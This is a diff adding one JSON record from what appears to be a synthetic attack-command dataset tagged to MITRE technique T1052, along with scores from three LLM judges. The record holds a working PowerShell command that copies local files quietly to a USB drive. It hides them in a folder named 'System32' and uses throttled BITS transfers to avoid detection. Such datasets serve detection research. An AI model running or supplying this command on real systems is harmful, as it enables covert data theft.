@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | Select-Object -First 1 -ExpandProperty DriveLetter); New-Item -Path \"$dl:\\System32\" -ItemType Directory -Force | Out-Null; Start-BitsTransfer -Source \"C:\\SourceData\\*\" -Destination \"$dl:\\System32\" -Priority Low",
+  "explanation": "Uses BITS to transfer local files quietly to a system-sounding folder on a USB device, keeping activity local and resilient.",
+  "rationale_steps": [
+    "Resolve the removable drive letter.",
+    "Create a plausible destination folder on the USB.",
+    "Use BITS to copy local files to the removable device."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-5d877001-88b580d5",
+  "source_prompt_hash": "5d877001",
+  "timestamp_utc": "2025-09-30T05:25:30.107478Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell command is well-formed with balanced quotes, valid cmdlets/parameters, and proper separators/pipelines.",
+        "semantic_score": 5,
+        "semantic_justification": "It locates a removable drive, creates a plausible directory, and uses BITS to quietly copy local files there, aligning with physical media exfiltration without requiring elevated privileges.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T07:02:53.647475Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed PowerShell with balanced parentheses, proper semicolon separators, valid cmdlet syntax, and correct parameter usage throughout all three pipeline stages.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1052 by detecting a removable drive, creating a deceptive 'System32' directory to blend in, and using BITS with low priority to quietly transfer files to the USB device while minimizing detection through both naming obfuscation and throttled transfer speed.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-18T22:31:36.864962Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses standard PowerShell cmdlets, correct piping, and valid variable expansion with no syntax errors.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively identifies a removable drive, creates a deceptive directory, and uses a legitimate background transfer service to move data, matching the technique's intent.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:31:42.539186Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
